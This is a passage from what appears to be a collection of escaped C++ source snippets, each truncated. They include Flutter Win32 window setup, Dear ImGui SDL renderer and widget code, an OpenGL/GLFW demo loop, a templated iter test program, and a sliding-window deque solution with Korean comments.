Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "// dear imgui: Renderer Backend for SDL_Renderer\n// (Requires: SDL 2.0.17+)\n\n// Important to understand: SDL_Renderer is an _optional_ component of SDL.\n// For a multi-platform app consider using e.g. SDL+DirectX on Windows and SDL+OpenGL on Linux/OSX.\n// If your application will want to render any non trivial amount of graphics other than UI,\n// please be aware that SDL_Renderer offers a limited graphic API to the end-user and it might\n// be difficult to step out of those boundaries.\n// However, we understand it is a convenient choice to get an app started easily.\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'SDL_Texture*' as ImTextureID. Read the FAQ about ImTextureID!\n//  [X] Renderer: Large meshes support (64k+ vertices) with 16-bit indices.\n// Missing features:\n//  [ ] Renderer: Multi-viewport support (multiple windows).\n\n// You can copy and use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n// CHANGELOG\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2021-12-21: Update SDL_RenderGeometryRaw() format to work with SDL 2.0.19.\n//  2021-12-03: Added support for large mesh (64K+ vertices), enable ImGuiBackendFlags_RendererHasVtxOffset flag.\n//  2021-10-06: Backup and restore modified ClipRect/Viewport.\n//  2021-09-21: Initial version.\n\n#include \"imgui.h\"\n#include \"imgui_impl_sdlrenderer.h\"\n#if defined(_MSC_VER) && _MSC_VER <= 1500 // MSVC 2008 or earlier\n#include <stddef.h>     // intptr_t\n#else\n#include <stdint.h>     // intptr_t\n#endif\n\n// SDL\n#include <SDL.h>\n#if !SDL_VERSION_ATLEAST(2,0,17)\n#error This backend requires SDL 2.0.17+ because of SDL_RenderGeometry() function\n#endif\n\n// SDL_Renderer data\nstruct ImGui_ImplSDLRenderer_Data\n{\n    SDL_Renderer*   SDLRenderer;\n    SDL_Texture*    FontTexture;\n    ImGui_ImplSDLRenderer_Data() { memset((void*)this, 0, sizeof(*this)); }\n};\n\n// Backend data stored in io.BackendRendererUserData to allow support for multiple Dear ImGui contexts\n// It is STRONGLY preferred that you use docking branch with multi-viewports (== single Dear ImGui context + multiple windows) instead of multiple Dear ImGui contexts.\nstatic ImGui_ImplSDLRenderer_Data* ImGui_ImplSDLRenderer_GetBackendData()\n{\n    return ImGui::GetCurrentContext() ? (ImGui_ImplSDLRenderer_Data*)ImGui::GetIO().BackendRendererUserData : nullptr;\n}\n\n// Functions\nbool ImGui_ImplSDLRenderer_Init(SDL_Renderer* renderer)\n{\n    ImGuiIO& io = ImGui::GetIO();\n    IM_ASSERT(io.BackendRendererUserData == nullptr && \"Already initialized a renderer backend!\");\n    IM_ASSERT(renderer != nullptr && \"SDL_Renderer not initialized!\");\n\n    // Setup backend capabilities flags\n    ImGui_ImplSDLRenderer_Data* bd = IM_NEW(ImGui_ImplSDLRenderer_Data)();\n    io.BackendRendererUserData = (void*)bd;\n    io.BackendRendererName = \"imgui_impl_sdlrenderer\";\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;  // We can honor the ImDrawCmd::VtxOffset field, allowing for large meshes.\n\n    bd->SDLRenderer = renderer;\n\n    return true;\n}\n\nvoid ImGui_ImplSDLRenderer_Shutdown()\n{\n    ImGui_ImplSDLRenderer_Data* bd = ImGui_ImplSDLRenderer_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"No renderer backend to shutdown, or already shutdown?\");\n    ImGuiIO& io = ImGui::GetIO();\n\n    ImGui_ImplSDLRenderer_DestroyDeviceObjects();\n\n    io.BackendRendererName = nullptr;\n    io.BackendRendererUserData = nullptr;\n    IM_DELETE(bd);\n}\n\nstatic void ImGui_ImplSDLRenderer_SetupRenderState()\n{\n\tImGui_ImplSDLRenderer_Data* bd = ImGui_ImplSDLRenderer_GetBackendData();\n\n\t// Clear out any viewports and cliprect set by the user\n    // FIXME: Technically speaking there are lots of other things we could backup/setup/restore during our render process.\n\tSDL_RenderSetViewport(bd->SDLRenderer, nullptr);\n\tSDL_RenderSetClipRect(bd->SDLRenderer, nullptr);\n}\n\nvoid ImGui_ImplSDLRenderer_NewFrame()\n{\n    ImGui_ImplSDLRenderer_Data* bd = ImGui_ImplSDLRenderer_GetBackendData();\n    IM_ASSERT(bd != nullptr && \"Did you call ImGui_ImplSDLRenderer_Init()?\");\n\n    if (!bd->FontTexture)\n        ImGui_ImplSDLRenderer_CreateDeviceObjects();\n}\n\nvoid ImGui_ImplSDLRenderer_RenderDrawData(ImDrawData* draw_data)\n{\n\tImGui_ImplSDLRenderer_Data* bd = ImGui_ImplSDLRenderer_GetBackendData();\n\n\t// If there's a scale factor set by the user, use that instead\n    // If the user has specified a scale factor to SDL_Renderer already via SDL_RenderSetScale(), SDL will scale whatever we pass\n    // to SDL_RenderGeometryRaw() by that scale factor. In that case we don't want to be also scaling it ourselves here.\n    float rsx = 1.0f;\n\tfloat rsy = 1.0f;\n\tSDL_RenderGetScale(bd->SDLRenderer, &rsx, &rsy);\n    ImVec2 render_scale;\n\trender_scale.x = (rsx == 1.0f) ? draw_data->FramebufferScale.x : 1.0f;\n\trender_scale.y = (rsy == ",
    "#include \"iter.hpp\"\n\nvoid  print_ints(const int &i)\n{\n    std::cout << \"INT: \" << i << '\\n';\n}\n\nint main()\n{\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    int array[4] = {1, 2, 3, 4};\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n    iter(array, 4, increment);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST DOUBLE ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    double doubleArray[] = {1.5, 2.5, 3.5, 4.5, 5.5};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n    iter(doubleArray, 5, doubleNumber);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << doubleArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST FLOAT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    float floatArray[] = {1.1f, 2.2f, 3.3f, 4.4f, 5.5f};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n    iter(floatArray, 5, square);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << floatArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 1:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::string stringArray[] = {\"hello\", \"world\", \"how\", \"are\", \"you\"};\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, addExclamation);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST STRING ARRAY 2:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    iter(stringArray, 5, capitalize);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    for (int i = 0; i < 5; ++i)\n    {\n        std::cout << stringArray[i] << std::endl;\n    }\n    std::cout << std::endl << RED \"---------------------------------------------------\"<< std::endl;\n\tstd::cout <<\"TEST CONST INT ARRAY:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    std::cout << std::endl << GREEN \"BEFORE ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    int array2[4] = {1, 2, 3, 4};\n    const int *array3 = array2;\n    for(int i = 0; i < 4; i++)\n    {\n        std::cout << \"Here: \" << array3[i] << std::endl;\n    }\n    std::cout << std::endl << GREEN \"FUNCTION TO PRINT ITER:\" << std::endl;\n\tstd::cout << \"---------------------------------------------------\" RESET << std::endl;\n    iter(array3, 4, print_ints);\n    std::cout << std::endl << GREEN \"AFTER ITER:\" << std::endl;\n\tstd::co",
    "#include <iostream>\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n#include <unistd.h>\n\n#include \"./shaders/FragShader.hpp\"\n#include \"./shaders/VertShader.hpp\"\n#include \"./shaders/ShaderProgram.hpp\"\n\n#include \"./buffers/VAO.hpp\"\n#include \"./buffers/VBO.hpp\"\n#include \"./buffers/EBO.hpp\"\n\n#include \"./obj/Board.hpp\"\n#include \"./obj/Lines.hpp\"\n#include \"./obj/Cube.hpp\"\n\n#include \"./camera/camera.hpp\"\n\n#include \"./lighting/Lighting.hpp\"\n\n#include \"./debug/debug.hpp\"\n\nusing namespace std;\n\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos) {}\n\nvoid handleEvents(GLFWwindow *window, Lighting lighting, unsigned int lightPosLoc){\n    \n    if(glfwGetKey(window, GLFW_KEY_UP)==GLFW_PRESS){\n        //lighting.lightPos = (lighting.lightPos+glm::vec3(0.0f, 0.01f, 0.0f));\n        view = glm::translate(view, glm::vec3(0.0f, -0.01f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_RIGHT)==GLFW_PRESS){\n        //lighting.lightPos = (lighting.lightPos+glm::vec3(0.01f, 0.0f, 0.0f));\n        view = glm::translate(view, glm::vec3(-0.01f, 0.0f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_LEFT)==GLFW_PRESS){\n        //lighting.lightPos = (lighting.lightPos+glm::vec3(-0.01f, 0.0f, 0.0f));\n        view = glm::translate(view, glm::vec3(0.01f, 0.0f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_DOWN)==GLFW_PRESS){\n        //lighting.lightPos = (lighting.lightPos+glm::vec3(0.0f, -0.01f, 0.0f));\n        view = glm::translate(view, glm::vec3(0.0f, 0.01f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_S)==GLFW_PRESS){\n        zoom-=0.01f;\n        if(zoom<=0.1f){\n            zoom=0.1f;\n        }\n        projection = glm::perspective(glm::radians(45.0f*zoom), 1.0f, 0.1f, 100.0f);\n    }\n    else if(glfwGetKey(window, GLFW_KEY_W)==GLFW_PRESS){\n        zoom+=0.01f;\n        if(zoom>=3){\n            zoom=3.0f;\n        }\n        projection = glm::perspective(glm::radians(45.0f*zoom), 1.0f, 0.1f, 100.0f);\n    }\n    glUniform3fv(lightPosLoc, 1, glm::value_ptr(lighting.getLightPos()));\n}\n\nint main(){\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    GLFWwindow* window = glfwCreateWindow(800, 800, \"Title\", NULL, NULL);\n    if(window==NULL){\n        cerr << \"error creating window\" << endl;\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    if(!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)){\n        cerr << \"Failed to initialize GLAD\" << endl;\n        return -1;\n    }\n\n    glViewport(0, 0, 800, 800);\n    //glfwSetCursorPosCallback(window, mouse_callback);\n\n    VertShader vertShader;\n    FragShader fragShader;\n\n    ShaderProgram shaderProgram;\n    shaderProgram.attachShader(vertShader.compileShader(), fragShader.compileShader());\n\n    vertShader.deleteShader();\n    fragShader.deleteShader();\n\n    //Board board;\n    Lines lines;\n    Cube cube;\n\n    glEnable(GL_DEPTH_TEST);\n\n    unsigned int modelLoc = glGetUniformLocation(shaderProgram.getProgram(), \"model\");\n    unsigned int viewLoc = glGetUniformLocation(shaderProgram.getProgram(), \"view\");\n    unsigned int projectionLoc = glGetUniformLocation(shaderProgram.getProgram(), \"projection\");\n\n    Lighting lighting(0.1f, {1.0f, 0.5f, 1.0f});\n    unsigned int ambientStrenghtLoc = glGetUniformLocation(shaderProgram.getProgram(), \"ambientStrength\");\n    unsigned int lightColorLoc = glGetUniformLocation(shaderProgram.getProgram(), \"lightColor\");\n    unsigned int lightPosLoc = glGetUniformLocation(shaderProgram.getProgram(), \"lightPos\");\n    unsigned int viewPosLoc = glGetUniformLocation(shaderProgram.getProgram(), \"viewPos\");\n    \n    while(!glfwWindowShouldClose(window)){\n        handleEvents(window, lighting, lightPosLoc);\n        glClearColor(0.0f, 0.0f, 0.0f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n        shaderProgram.useProgram();\n\n        glUniformMatrix4fv(modelLoc, 1, GL_FALSE, glm::value_ptr(model));\n        glUniformMatrix4fv(viewLoc, 1, GL_FALSE, glm::value_ptr(view));\n        glUniformMatrix4fv(projectionLoc, 1, GL_FALSE, glm::value_ptr(projection));\n\n        glUniform3fv(ambientStrenghtLoc, 1, glm::value_ptr(lighting.getAmbientStrenght()));\n        glUniform3fv(lightColorLoc, 1, glm::value_ptr(lighting.getLightColor()));\n        glUniform3fv(lightPosLoc, 1, glm::value_ptr(lighting.getLightPos()));\n        glUniform3fv(viewPosLoc, 1, glm::value_ptr(cameraPos));\n\n        lines.renderLines();\n        //board.renderBoard();\n        cube.renderCube();\n        \n        //cout << zoom << endl;\n\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n    //board.deleteBoard();\n    shaderProgram.deleteProgram();\n    glfwDestroyWindow(window);\n    glfwTerminate();\n\n    return 0;\n}\n\n",
    "#include <iostream>\r\n#include <deque>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nint main(){\r\n    ios::sync_with_stdio(false);\r\n    cin.tie(NULL); cout.tie(NULL);\r\n    int n,m,c,input;\r\n    deque <int> dq[2];//\uac12\uc774 \uc544\ub2cc \uc778\ub371\uc2a4\ub97c \uc800\uc7a5\r\n    vector <int> vt, max, min, ans;//\uac12\uc744 \uc800\uc7a5, \ubc94\uc704 \ub0b4\uc758 \ucd5c\ub313\uac12\uc758 \uc778\ub371\uc2a4\ub97c \uc800\uc7a5\r\n    cin >> n >> m >> c;\r\n    for(int i = 0;i<n;i++){\r\n        cin >> input;\r\n        vt.push_back(input);\r\n    }\r\n    for(int i = 0;i<vt.size();i++){\r\n        while(!dq[0].empty() && vt[dq[0].back()] <= vt[i]) dq[0].pop_back();\r\n\r\n        while(!dq[1].empty() && vt[dq[1].back()] >= vt[i]) dq[1].pop_back();\r\n        \r\n        dq[0].push_back(i); dq[1].push_back(i);\r\n\r\n        if(dq[0].front() == i-m) dq[0].pop_front();\r\n        if(dq[1].front() == i-m) dq[1].pop_front();\r\n        \r\n        if(i >= m-1){\r\n            max.push_back(dq[0].front());\r\n            min.push_back(dq[1].front());\r\n        }\r\n    }\r\n    for(int i = 0;i<max.size();i++){\r\n        if(vt[max[i]] - vt[min[i]] <= c){\r\n            ans.push_back(i+1);\r\n        }\r\n    }\r\n    if(ans.empty()) cout << \"NONE\";\r\n    else{\r\n        for(int i = 0;i<ans.size();i++){\r\n            cout << ans[i] << '\\n';\r\n        }\r\n    }\r\n}\r\n/*\ubb38\uc81c \ucf54\ub4dc \ub2f5\uc744 \ubcf8 \uac74 \uc544\ub2c8\uc9c0\ub9cc \uc0ac\uc2e4\uc0c1 \ubcf8 \uac70\ub098 \ub2e4\ub984 \uc5c6\uc74c.\r\n\r\n\uc774\ubc88 \ubb38\uc81c \ud480\uc774\ub85c \uc548 \uc54c\uace0\ub9ac\uc998: \r\n\uc2ac\ub77c\uc774\ub529 \uc708\ub3c4\uc6b0\ub97c \ud1b5\ud55c \ub371\uc744 \uc774\uc6a9\ud55c \ucd5c\ub300 \ucd5c\uc18c \uac12 \uad6c\ud558\uae30 \uc54c\uace0\ub9ac\uc998\r\n\uc2ac\ub77c\uc774\ub529 \uc708\ub3c4\uc6b0\ub780 \ubc30\uc5f4\uc758 \uc5b4\ub290 \ubc94\uc704 \uc548\uc5d0\uc11c \ud55c \uce78\uc529 \uc774\ub3d9\ud558\uba74\uc11c \ubd80\ubd84\uc758 \uac12\uc744 \uc774\uc6a9\ud558\ub294 \uac83\r\n\r\n\ubcf4\ud1b5 \ubc30\uc5f4 \ub0b4\uc5d0\uc11c \ucd5c\ub300 \ucd5c\uc18c \uac12\uc744 \uad6c\ud560 \ub550 \ub2e8\uc21c\ud558\uac8c \ub5a0\uc624\ub974\ub294 \uac74 (\ube0c\ub8e8\ud2b8\ud3ec\uc2a4) \uc774\uc911 \ubc18\ubcf5\ubb38\uc774\ub2e4. \uc2dc\uac04 \ubcf5\uc7a1\ub3c4\ub294 O(N^2)\r\n\uad6c\ud604\uc740 \uac04\ub2e8\ud558\uc9c0\ub9cc \ub9ce\uc740 \uac12\uc744 \uc5f0\uc0b0\ud560 \uacbd\uc6b0 \uc2dc\uac04\ucd08\uacfc\ub418\uae30 \ub531 \uc88b\ub2e4.\r\n\r\n\uc790\uc138\ud55c \uac74 \uc54c\uace0\ub9ac\uc998 \ud3f4\ub354\uc5d0\uc11c \ucc38\uace0\r\n\r\n\ubb38\uc81c \uacfc\uc815\uc740 \uac04\ub2e8\ud558\ub2e4.\r\n1. \uc785\ub825\uac12\uc744 \ubca1\ud130\uc5d0 \ub2f4\ub294\ub2e4.\r\n2. \uc774\uc81c\ubd80\ud130 \ub371\uc744 \uc774\uc6a9\ud55c\ub2e4. \uc774\ub54c \ub371\uc5d0\ub294 \uc694\uc18c \uc790\uccb4\ub97c \ub2f4\uc9c0 \uc54a\uace0 \uc778\ub371\uc2a4\ub97c \ub2f4\ub294\ub2e4.**\r\n\ucd5c\ub300\uc640 \ucd5c\uc18c\ub97c \uad6c\ud574\uc57c\ud558\ubbc0\ub85c 2\uac1c\uc758 \ub371\uc744 \uc774\uc6a9\ud588\ub2e4.\r\n2-1. \uc778\ub371\uc2a4\ub97c \ucc28\uadfc \ucc28\uadfc \ub2f4\ub294\ub370, \uc774\ub54c \uc911\uc694\ud55c \uac74 front\uc5d0 \ucd5c\ub313\uac12\uc774 \ud56d\uc0c1 \uc874\uc7ac\ud574\uc57c \ud55c\ub2e4.\r\n\ub371\uc758 back()\uacfc vt[i]\ub97c \ube44\uad50\ud558\uc5ec \uc0c8\ub85c \ucd5c\ub313\uac12\uc774 \ubc1c\uacac\ub418\uba74 pop\ud55c\ub2e4.\r\n2-2. \uadf8\ub9ac\uace0 \uc708\ub3c4\uc6b0 \ubc94\uc704 \ubc16\uc758 \ucd5c\ub313\uac12\uc740 \ubc84\ub824\uc57c \ud558\ubbc0\ub85c i-m\uacfc front\uac00 \uac19\uc544\uc9c0\ub294, \uc989 \ubc94\uc704\ub97c \ubc97\uc5b4\ub09c \uc989\uc2dc \uc0ad\uc81c\ud55c\ub2e4.\r\n2-3. i >= m-1\uc758 \uc870\uac74\uc740 \ucc98\uc74c \uc2dc\uc791 \uc2dc \uc708\ub3c4\uc6b0\uac00 m\ub9cc\ud07c \ubc94\uc704\ub97c \uac00\uc9c8 \ub54c\ubd80\ud130 \uac12\uc744 \ubc18\ud658\uc2dc\ud0a8\ub2e4.\r\n*/\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// dear imgui, v1.90 WIP\n// (widgets code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Widgets: Text, etc.\n// [SECTION] Widgets: Main (Button, Image, Checkbox, RadioButton, ProgressBar, Bullet, etc.)\n// [SECTION] Widgets: Low-level Layout helpers (Spacing, Dummy, NewLine, Separator, etc.)\n// [SECTION] Widgets: ComboBox\n// [SECTION] Data Type and Data Formatting Helpers\n// [SECTION] Widgets: DragScalar, DragFloat, DragInt, etc.\n// [SECTION] Widgets: SliderScalar, SliderFloat, SliderInt, etc.\n// [SECTION] Widgets: InputScalar, InputFloat, InputInt, etc.\n// [SECTION] Widgets: InputText, InputTextMultiline\n// [SECTION] Widgets: ColorEdit, ColorPicker, ColorButton, etc.\n// [SECTION] Widgets: TreeNode, CollapsingHeader, etc.\n// [SECTION] Widgets: Selectable\n// [SECTION] Widgets: Typing-Select support\n// [SECTION] Widgets: Multi-Select support\n// [SECTION] Widgets: ListBox\n// [SECTION] Widgets: PlotLines, PlotHistogram\n// [SECTION] Widgets: Value helpers\n// [SECTION] Widgets: MenuItem, BeginMenu, EndMenu, etc.\n// [SECTION] Widgets: BeginTabBar, EndTabBar, etc.\n// [SECTION] Widgets: BeginTabItem, EndTabItem, etc.\n// [SECTION] Widgets: Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n\n// System includes\n#include <stdint.h>     // intptr_t\n\n//-------------------------------------------------------------------------\n// Warnings\n//-------------------------------------------------------------------------\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#if defined(_MSC_VER) && _MSC_VER >= 1922 // MSVC 2019 16.2 or later\n#pragma warning (disable: 5054)     // operator '|': deprecated between enumerations of different types\n#endif\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3).\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants (typically 0.0f) is ok.\n#pragma clang diagnostic ignored \"-Wformat-nonliteral\"              // warning: format string 